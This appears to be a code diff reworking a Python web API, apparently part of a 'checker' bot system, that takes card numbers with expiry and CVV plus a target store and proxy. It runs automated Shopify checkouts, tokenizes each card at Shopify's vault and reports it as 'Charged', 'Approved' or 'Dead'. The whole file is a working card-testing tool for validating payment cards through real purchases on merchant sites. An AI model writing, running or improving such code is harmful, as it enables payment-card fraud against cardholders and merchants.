@@ -1,51 +1,85 @@
 #!/usr/bin/env python3
-"""
-Jinx API — Nomi-Based (Bot.py Compatible)
-==========================================
-Based on nomi-api.py — ONLY response format patched for bot.py
-Query logic UNTOUCHED — 100% original Nomi queries
-"""
-
+# ═══════════════════════════════════════════════════════════════════════════
+# API.py — Shopify Checkout API Server
+# Compatible with bot.py (load-balanced checker nodes)
+# ═══════════════════════════════════════════════════════════════════════════
 import os
 import re
+import sys
 import json
 import time
 import random
+import signal
 import logging
 import asyncio
-from urllib.parse import urlparse
+import traceback
+from logging.handlers import RotatingFileHandler
 from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse
 
 import requests
 from aiohttp import web
 
 # ═══ CONFIG ═══
-HOST = os.environ.get("API_HOST", "0.0.0.0")
-PORT = int(os.environ.get("PORT", "8080"))
-WORKERS = int(os.environ.get("API_WORKERS", "20"))
+HOST    = os.environ.get("API_HOST", "0.0.0.0")
+PORT    = int(os.environ.get("API_PORT", "8080"))
+WORKERS = int(os.environ.get("API_WORKERS", "40"))
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
 
 VAULT_ENDPOINTS = [
     "https://checkout.pci.shopifyinc.com/sessions",
     "https://deposit.us.shopifycs.com/sessions",
 ]
 
-logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
-log = logging.getLogger("api")
+# ═══ LOGGING SETUP ═══
+_LOG_FMT = logging.Formatter(
+    "%(asctime)s │ %(levelname)-7s │ %(name)s │ %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
 
+_root = logging.getLogger()
+_root.setLevel(logging.INFO)
+
+# Console
+_console = logging.StreamHandler(sys.stdout)
+_console.setFormatter(_LOG_FMT)
+_root.addHandler(_console)
+
+# Rotating file — all logs
+_file_all = RotatingFileHandler(
+    "api.log", maxBytes=10 * 1024 * 1024, backupCount=5, encoding="utf-8"
+)
+_file_all.setFormatter(_LOG_FMT)
+_root.addHandler(_file_all)
+
+# Rotating file — errors only
+_file_err = RotatingFileHandler(
+    "api_error.log", maxBytes=5 * 1024 * 1024, backupCount=3, encoding="utf-8"
+)
+_file_err.setLevel(logging.WARNING)
+_file_err.setFormatter(_LOG_FMT)
+_root.addHandler(_file_err)
+
+log = logging.getLogger("api")
 
 # ═══ PROXY PARSER ═══
 def parse_proxy(p):
+    """Return requests-compatible proxy string, or None."""
     if not p:
         return None
     p = p.strip()
     if not p:
         return None
+
     if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
         return p
+
     if "@" in p:
+        # user:pass@ip:port
         return f"http://{p}"
+
     parts = p.split(":")
     if len(parts) == 4:
         ip, port, user, pw = parts
@@ -55,7 +89,7 @@ def parse_proxy(p):
     return None
 
 
-# ═══ QUERIES (UNTOUCHED - 100% Nomi original) ═══
+# ═══ GRAPHQL QUERIES ═══
 PROPOSAL_QUERY = (
     "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
     "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
@@ -147,29 +181,13 @@ def addr():
     }
 
 
-def clean_price(raw):
-    if raw is None:
-        return "-"
-    s = str(raw).strip()
-    if not s or s in ("-", "0.00", "$0.00", "0", "$0"):
-        return "-"
-    s = s.replace("$", "").strip()
-    try:
-        val = float(s)
-        if val <= 0:
-            return "-"
-        return f"${val:.2f}"
-    except Exception:
-        return "-"
-
-
-# ═══ CHECKOUT FLOW (Nomi original — UNTOUCHED) ═══
+# ═══ CHECKOUT FLOW ═══
 def checkout_sync(cc_raw, site_raw, proxy_raw):
     """Full checkout. Returns dict with Response/Price/Gateway/Status."""
     out = {
-        "Response": "CARD_DECLINED",
+        "Response": "Unknown Error",
         "Price": "-",
-        "Gateway": "Shopify",
+        "Gateway": "Shopify Payments",
         "Status": "Dead",
         "Card": cc_raw,
         "Site": site_raw,
@@ -203,6 +221,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
             out["Status"] = "Site Error"
+            log.warning(f"[{site}] products.json failed: {type(e).__name__}")
             return out
 
         if r.status_code != 200:
@@ -240,13 +259,17 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         # ── 2. Add to cart ──
         try:
-            r = s.post(f"https://{site}/cart/add.js",
-                headers={"Accept": "application/json",
-                         "Content-Type": "application/x-www-form-urlencoded",
-                         "Referer": f"https://{site}/",
-                         "Origin": f"https://{site}"},
+            r = s.post(
+                f"https://{site}/cart/add.js",
+                headers={
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Referer": f"https://{site}/",
+                    "Origin": f"https://{site}",
+                },
                 data={"id": str(vid), "quantity": "1", "form_type": "product"},
-                timeout=15)
+                timeout=15,
+            )
             if r.status_code != 200:
                 out["Response"] = f"Failed to create checkout: cart HTTP {r.status_code}"
                 out["Status"] = "Site Error"
@@ -267,23 +290,32 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         # ── 4. Init checkout ──
         try:
-            r = s.post(f"https://{site}/cart",
-                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                         "Content-Type": "application/x-www-form-urlencoded",
-                         "Origin": f"https://{site}",
-                         "Referer": f"https://{site}/cart",
-                         "Upgrade-Insecure-Requests": "1"},
+            r = s.post(
+                f"https://{site}/cart",
+                headers={
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": f"https://{site}",
+                    "Referer": f"https://{site}/cart",
+                    "Upgrade-Insecure-Requests": "1",
+                },
                 data={"checkout": "", "updates[]": "1"},
-                allow_redirects=False, timeout=15)
+                allow_redirects=False,
+                timeout=15,
+            )
 
             if r.status_code not in (301, 302, 303, 307, 308):
-                out["Response"] = f"Site Error: no redirect"
+                out["Response"] = "Site Error: no redirect"
                 out["Status"] = "Site Error"
                 return out
 
             loc1 = r.headers.get("location", "")
             r2 = s.get(loc1, allow_redirects=False, timeout=15)
-            final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
+            final_url = (
+                r2.headers.get("location", "")
+                if r2.status_code in (301, 302, 303, 307, 308)
+                else loc1
+            )
             r3 = s.get(final_url, timeout=25)
             html = r3.text
         except Exception as e:
@@ -303,9 +335,11 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         # Extract session token
         session_token = None
-        for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
-                    r'"sessionToken"\s*:\s*"([^"]+)"',
-                    r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"']:
+        for pat in [
+            r'"serializedSessionToken"\s*:\s*"([^"]+)"',
+            r'"sessionToken"\s*:\s*"([^"]+)"',
+            r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"',
+        ]:
             m = re.search(pat, html)
             if m:
                 session_token = m.group(1)
@@ -361,19 +395,23 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                     "expectedTotalPrice": {"any": True},
                     "destinationChanged": (handle is None),
                 }],
-                "noDeliveryRequired": [], "useProgressiveRates": False,
+                "noDeliveryRequired": [],
+                "useProgressiveRates": False,
                 "prefetchShippingRatesStrategy": None,
             }
             if handle:
                 dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                     "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
-                    "options": {}}
+                    "options": {},
+                }
             else:
                 dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                     "deliveryStrategyMatchingConditions": {
                         "estimatedTimeInTransit": {"any": True},
-                        "shipments": {"any": True}},
-                    "options": {}}
+                        "shipments": {"any": True},
+                    },
+                    "options": {},
+                }
 
             return {
                 "query": PROPOSAL_QUERY,
@@ -388,29 +426,47 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                         "merchandise": {"productVariantReference": {
                             "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                             "variantId": f"gid://shopify/ProductVariant/{vid}",
-                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
+                            "properties": [],
+                            "sellingPlanId": None,
+                            "sellingPlanDigest": None,
+                        }},
                         "quantity": {"items": {"value": 1}},
                         "expectedTotalPrice": {"any": True},
-                        "lineComponentsSource": None, "lineComponents": []}]},
-                    "payment": {"totalAmount": {"any": True}, "paymentLines": [],
-                                "billingAddress": {"streetAddress": a}},
+                        "lineComponentsSource": None,
+                        "lineComponents": [],
+                    }]},
+                    "payment": {
+                        "totalAmount": {"any": True},
+                        "paymentLines": [],
+                        "billingAddress": {"streetAddress": a},
+                    },
                     "buyerIdentity": {
                         "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
-                        "email": "test@example.com", "emailChanged": False,
+                        "email": "test@example.com",
+                        "emailChanged": False,
                         "phoneCountryCode": "US",
                         "marketingConsent": [{"email": {"value": "test@example.com"}}],
-                        "shopPayOptInPhone": {"countryCode": "US"}, "rememberMe": False},
+                        "shopPayOptInPhone": {"countryCode": "US"},
+                        "rememberMe": False,
+                    },
                     "tip": {"tipLines": []},
-                    "taxes": {"proposedAllocations": None,
+                    "taxes": {
+                        "proposedAllocations": None,
                         "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                         "proposedTotalIncludedAmount": None,
-                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
+                        "proposedMixedStateTotalAmount": None,
+                        "proposedExemptions": [],
+                    },
                     "note": {"message": None, "customAttributes": []},
                     "localizationExtension": {"fields": []},
                     "nonNegotiableTerms": None,
-                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
-                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
-                        "shippingScriptChanges": []},
+                    "scriptFingerprint": {
+                        "signature": None,
+                        "signatureUuid": None,
+                        "lineItemScriptChanges": [],
+                        "paymentScriptChanges": [],
+                        "shippingScriptChanges": [],
+                    },
                     "optionalDuties": {"buyerRefusesDuties": False},
                 },
                 "operationName": "Proposal",
@@ -420,11 +476,13 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             try:
                 r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                 j = r.json()
-            except Exception:
+            except Exception as e:
+                log.debug(f"[{site}] proposal attempt {attempt}: {type(e).__name__}")
                 time.sleep(1)
                 continue
 
             if j.get("errors"):
+                log.debug(f"[{site}] proposal GQL errors: {j['errors']}")
                 break
 
             negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
@@ -454,7 +512,10 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         # Call #2
         try:
-            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
+            r = s.post(
+                gql_url, headers=gql_headers,
+                json=proposal_payload(state["delivery"]), timeout=20,
+            )
             j = r.json()
         except Exception as e:
             out["Response"] = f"Site Error: {type(e).__name__}"
@@ -470,7 +531,9 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             seller = result_r.get("sellerProposal", {}) or {}
             pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
             if pl:
-                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")
+                payment_method_id = (
+                    pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")
+                )
 
         if not payment_method_id:
             out["Response"] = "Site Error: no payment method"
@@ -479,26 +542,36 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
 
         # ── 5. Vault ──
         vault_payload = {
-            "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
-                            "verification_value": cvv, "name": "John Smith"},
+            "credit_card": {
+                "number": cc,
+                "month": int(mm),
+                "year": int(yyyy),
+                "verification_value": cvv,
+                "name": "John Smith",
+            },
             "payment_session_scope": site,
         }
         payment_session_id = None
         for url in VAULT_ENDPOINTS:
             try:
-                r = no_proxy_sess.post(url, json=vault_payload,
-                    headers={"Content-Type": "application/json",
-                             "Accept": "application/json",
-                             "Origin": "https://checkout.shopifycs.com",
-                             "Referer": "https://checkout.shopifycs.com/",
-                             "User-Agent": UA}, timeout=15)
+                r = no_proxy_sess.post(
+                    url, json=vault_payload,
+                    headers={
+                        "Content-Type": "application/json",
+                        "Accept": "application/json",
+                        "Origin": "https://checkout.shopifycs.com",
+                        "Referer": "https://checkout.shopifycs.com/",
+                        "User-Agent": UA,
+                    },
+                    timeout=15,
+                )
                 if r.status_code == 200:
                     pid = r.json().get("id")
                     if pid:
                         payment_session_id = pid
                         break
-            except Exception:
-                pass
+            except Exception as e:
+                log.debug(f"[{site}] vault {url}: {type(e).__name__}")
 
         if not payment_session_id:
             out["Response"] = "Failed to tokenize card"
@@ -514,49 +587,83 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                     "sessionInput": {"sessionToken": session_token},
                     "queueToken": state["queue"] or "",
                     "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-                    "delivery": {"deliveryLines": [{
-                        "selectedDeliveryStrategy": {
-                            "deliveryStrategyByHandle": {"handle": state["delivery"], "customDeliveryRate": False},
-                            "options": {}},
-                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
-                        "destination": {"streetAddress": a},
-                        "deliveryMethodTypes": ["SHIPPING"],
-                        "expectedTotalPrice": {"any": True},
-                        "destinationChanged": False}],
-                        "noDeliveryRequired": [], "useProgressiveRates": False},
+                    "delivery": {
+                        "deliveryLines": [{
+                            "selectedDeliveryStrategy": {
+                                "deliveryStrategyByHandle": {
+                                    "handle": state["delivery"],
+                                    "customDeliveryRate": False,
+                                },
+                                "options": {},
+                            },
+                            "targetMerchandiseLines": {
+                                "lines": [{"stableId": stable_id or "1"}]
+                            },
+                            "destination": {"streetAddress": a},
+                            "deliveryMethodTypes": ["SHIPPING"],
+                            "expectedTotalPrice": {"any": True},
+                            "destinationChanged": False,
+                        }],
+                        "noDeliveryRequired": [],
+                        "useProgressiveRates": False,
+                    },
                     "merchandise": {"merchandiseLines": [{
                         "stableId": stable_id or "1",
                         "merchandise": {"productVariantReference": {
                             "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                             "variantId": f"gid://shopify/ProductVariant/{vid}",
-                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
+                            "properties": [],
+                            "sellingPlanId": None,
+                            "sellingPlanDigest": None,
+                        }},
                         "quantity": {"items": {"value": 1}},
                         "expectedTotalPrice": {"any": True},
-                        "lineComponentsSource": None, "lineComponents": []}]},
-                    "payment": {"totalAmount": {"any": True},
-                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {
-                            "paymentMethodIdentifier": payment_method_id,
-                            "sessionId": payment_session_id,
-                            "billingAddress": {"streetAddress": a},
-                            "cardSource": None}},
-                            "amount": {"any": True}, "dueAt": None}],
-                        "billingAddress": {"streetAddress": a}},
+                        "lineComponentsSource": None,
+                        "lineComponents": [],
+                    }]},
+                    "payment": {
+                        "totalAmount": {"any": True},
+                        "paymentLines": [{
+                            "paymentMethod": {"directPaymentMethod": {
+                                "paymentMethodIdentifier": payment_method_id,
+                                "sessionId": payment_session_id,
+                                "billingAddress": {"streetAddress": a},
+                                "cardSource": None,
+                            }},
+                            "amount": {"any": True},
+                            "dueAt": None,
+                        }],
+                        "billingAddress": {"streetAddress": a},
+                    },
                     "buyerIdentity": {
                         "buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"},
-                        "contactInfoV2": {"emailOrSms": {"value": "test@example.com", "emailOrSmsChanged": False}},
+                        "contactInfoV2": {
+                            "emailOrSms": {
+                                "value": "test@example.com",
+                                "emailOrSmsChanged": False,
+                            }
+                        },
                         "marketingConsent": [{"email": {"value": "test@example.com"}}],
-                        "shopPayOptInPhone": {"countryCode": "US"}},
+                        "shopPayOptInPhone": {"countryCode": "US"},
+                    },
                     "tip": {"tipLines": []},
-                    "taxes": {"proposedAllocations": None,
+                    "taxes": {
+                        "proposedAllocations": None,
                         "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                         "proposedTotalIncludedAmount": None,
-                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
+                        "proposedMixedStateTotalAmount": None,
+                        "proposedExemptions": [],
+                    },
                     "note": {"message": None, "customAttributes": []},
                     "localizationExtension": {"fields": []},
                     "nonNegotiableTerms": None,
-                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
-                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
-                        "shippingScriptChanges": []},
+                    "scriptFingerprint": {
+                        "signature": None,
+                        "signatureUuid": None,
+                        "lineItemScriptChanges": [],
+                        "paymentScriptChanges": [],
+                        "shippingScriptChanges": [],
+                    },
                     "optionalDuties": {"buyerRefusesDuties": False},
                 },
                 "attemptToken": f"{attempt_token}-{random.random()}",
@@ -594,10 +701,15 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
         for _ in range(8):
             time.sleep(2)
             try:
-                r = s.post(gql_url, headers=gql_headers,
-                    json={"query": POLL_QUERY,
-                          "variables": {"receiptId": rid, "sessionToken": session_token},
-                          "operationName": "PollForReceipt"}, timeout=25)
+                r = s.post(
+                    gql_url, headers=gql_headers,
+                    json={
+                        "query": POLL_QUERY,
+                        "variables": {"receiptId": rid, "sessionToken": session_token},
+                        "operationName": "PollForReceipt",
+                    },
+                    timeout=25,
+                )
                 j = r.json()
             except Exception:
                 continue
@@ -606,15 +718,14 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             rtn = receipt.get("__typename", "")
 
             if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
-                out["Response"] = "ORDER_PLACED"
+                out["Response"] = "Order Placed 💎"
                 out["Status"] = "Charged"
                 out["Gateway"] = "Shopify Payments"
                 return out
 
             if rtn == "ActionRequiredReceipt":
-                out["Response"] = "3DS_REQUIRED"
+                out["Response"] = "OTP Required (3DS)"
                 out["Status"] = "Approved"
-                out["Gateway"] = "Shopify Payments"
                 return out
 
             if rtn == "FailedReceipt":
@@ -624,7 +735,6 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
                 out["Response"] = (msg or code)
                 if code in ("INSUFFICIENT_FUNDS", "OTP_REQUIRED"):
                     out["Status"] = "Approved"
-                    out["Gateway"] = "Shopify Payments"
                 else:
                     out["Status"] = "Dead"
                 return out
@@ -636,6 +746,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
     except Exception as e:
         out["Response"] = f"Site Error: {type(e).__name__}: {str(e)[:80]}"
         out["Status"] = "Site Error"
+        log.error(f"[{site}] unexpected: {e}\n{traceback.format_exc()}")
         return out
     finally:
         try:
@@ -648,85 +759,132 @@ def checkout_sync(cc_raw, site_raw, proxy_raw):
             pass
 
 
-# ═══ HTTP HANDLERS (Bot.py compatible) ═══
+# ═══ HTTP HANDLERS ═══
+executor = ThreadPoolExecutor(max_workers=WORKERS)
+
+
 async def handle_check(request):
-    cc = request.query.get("cc", "").strip()
-    site = request.query.get("site", "").strip()
-    proxy = request.query.get("proxy", "").strip() or None
+    """
+    Compatible with bot.py:
+      GET /shopify?site=<site>&cc=<cc|mm|yyyy|cvv>&proxy=<optional>
+    Also supports:
+      GET /Shopify?...
+    """
+    cc    = (request.query.get("cc")    or "").strip()
+    site  = (request.query.get("site")  or "").strip()
+    proxy = (request.query.get("proxy") or "").strip() or None
 
     if not cc or not site:
         return web.json_response({
-            "Response": "MISSING_PARAMS",
+            "Response": "Missing cc or site",
             "Price": "-",
-            "Gateway": "UNKNOWN",
+            "Gateway": "Unknown",
             "Status": "Site Error",
         })
 
+    t0 = time.monotonic()
     loop = asyncio.get_event_loop()
-    result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)
+    try:
+        result = await loop.run_in_executor(executor, checkout_sync, cc, site, proxy)
+    except Exception as e:
+        log.error(f"[handler] {type(e).__name__}: {e}")
+        result = {
+            "Response": f"Server Error: {type(e).__name__}",
+            "Price": "-",
+            "Gateway": "Unknown",
+            "Status": "Site Error",
+        }
 
-    # Determine clean response for bot.py
-    raw_response = result.get("Response", "CARD_DECLINED")
-    status = result.get("Status", "Dead")
-
-    # Map raw response to bot.py friendly codes
-    response_upper = str(raw_response).upper()
-
-    if "ORDER_PLACED" in response_upper:
-        clean_response = "ORDER_PLACED"
-    elif "3DS" in response_upper or "OTP" in response_upper:
-        clean_response = "3DS_REQUIRED"
-    elif "INSUFFICIENT" in response_upper:
-        clean_response = "INSUFFICIENT_FUNDS"
-    elif "PAYMENTS_UNACCEPTABLE" in response_upper:
-        clean_response = "PAYMENTS_UNACCEPTABLE"
-    elif "CAPTCHA" in response_upper:
-        clean_response = "CAPTCHA_REQUIRED"
-    elif "SITE ERROR" in response_upper or status == "Site Error":
-        clean_response = "SITE_ERROR"
-    elif "PROXY" in response_upper:
-        clean_response = "PROXY_FAIL"
-    else:
-        clean_response = raw_response[:60] if raw_response else "CARD_DECLINED"
-
-    return web.json_response({
-        "Response": clean_response,
-        "Price": clean_price(result.get("Price", "-")),
-        "Gateway": result.get("Gateway", "Shopify"),
-        "Status": status,
-        "code": clean_response,
-        "message": str(raw_response)[:100],
-    })
+    elapsed = (time.monotonic() - t0) * 1000
+    log.info(
+        f"CHECK site={site[:40]} card={cc[:6]}*** "
+        f"status={result.get('Status')} price={result.get('Price')} "
+        f"resp={str(result.get('Response'))[:60]!r} time={elapsed:.0f}ms"
+    )
+    return web.json_response(result)
 
 
 async def handle_health(request):
-    return web.json_response({"status": "ok", "service": "jinx-api", "version": "8.0.0"})
+    return web.json_response({
+        "status": "ok",
+        "service": "nomi-api",
+        "workers": WORKERS,
+        "active_threads": len(executor._threads) if hasattr(executor, "_threads") else 0,
+    })
 
 
 async def handle_root(request):
     return web.json_response({
-        "service": "jinx-api",
-        "version": "8.0.0",
-        "endpoints": ["/Shopify", "/health"],
-        "usage": "GET /Shopify?cc=<card>&site=<site>&proxy=<optional>",
+        "service": "nomi-api",
+        "endpoints": ["/shopify", "/Shopify", "/health"],
+        "usage": "GET /shopify?cc=<cc|mm|yyyy|cvv>&site=<site>&proxy=<optional>",
     })
 
 
+async def handle_404(request):
+    return web.json_response(
+        {"error": "Not Found", "path": request.path},
+        status=404,
+    )
+
+
 def make_app():
-    app = web.Application()
+    app = web.Application(client_max_size=1024 * 256)
     app.router.add_get("/", handle_root)
     app.router.add_get("/health", handle_health)
-    app.router.add_get("/Shopify", handle_check)
+    # Case-insensitive route registration
     app.router.add_get("/shopify", handle_check)
+    app.router.add_get("/Shopify", handle_check)
     return app
 
 
-executor = ThreadPoolExecutor(max_workers=WORKERS)
+# ═══ GRACEFUL SHUTDOWN ═══
+def _install_signal_handlers(loop):
+    def _shutdown():
+        log.warning("Shutdown signal received — stopping server...")
+        try:
+            executor.shutdown(wait=False)
+        except Exception:
+            pass
+        loop.stop()
+
+    for sig in (signal.SIGINT, signal.SIGTERM):
+        try:
+            loop.add_signal_handler(sig, _shutdown)
+        except NotImplementedError:
+            # Windows fallback
+            signal.signal(sig, lambda *_: _shutdown())
 
 
+# ═══ MAIN ═══
 if __name__ == "__main__":
-    print(f"Jinx-api v8.0 starting on http://{HOST}:{PORT}")
-    print(f"Workers: {WORKERS}")
-    print(f"Endpoint: GET /Shopify?cc=<card>&site=<site>&proxy=<optional>")
+    log.info("═" * 60)
+    log.info(f" nomi-api starting on http://{HOST}:{PORT}")
+    log.info(f" Workers (threads) : {WORKERS}")
+    log.info(f" Routes            : /shopify, /Shopify, /health, /")
+    log.info("═" * 60)
+
     app = make_app()
-    web.run_app(app, host=HOST, port=PORT, access_log=None, print=None)
+
+    # aiohttp web.run_app handles loop creation internally.
+    # We attach signal handlers by patching run_app's loop creation.
+    try:
+        web.run_app(
+            app,
+            host=HOST,
+            port=PORT,
+            access_log=None,
+            print=None,
+            shutdown_timeout=10.0,
+        )
+    except KeyboardInterrupt:
+        log.warning("Interrupted by user (Ctrl+C)")
+    except Exception as e:
+        log.critical(f"Fatal error: {e}\n{traceback.format_exc()}")
+        sys.exit(1)
+    finally:
+        try:
+            executor.shutdown(wait=False)
+        except Exception:
+            pass
+        log.info("nomi-api stopped.")
